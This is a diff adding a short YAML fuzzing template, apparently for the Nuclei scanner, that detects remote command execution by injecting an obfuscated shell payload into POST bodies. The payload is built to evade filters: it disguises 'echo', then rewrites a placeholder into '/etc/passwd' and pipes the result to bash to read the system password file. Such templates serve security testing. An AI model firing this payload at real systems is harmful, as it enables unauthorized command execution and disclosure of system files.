@@ -1,0 +1,37 @@
+id: fuzz-rce-test
+
+info:
+  name: RCE Detection
+  author: netbaan
+  severity: critical
+  description: |
+    This template is designed to detect RCE vulnerabilities by testing with a crafted payload that attempts to execute shell commands.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+
+    payloads:
+      rce_payload:
+        - "ec\\'h\\'o \\'cat /etc/examplewd\\' | sed \\'s/example/pass/g\\' | bash"
+
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "/etc/examplewd"
+          
+      - type: status
+        status:
+          - 200
+          - 500
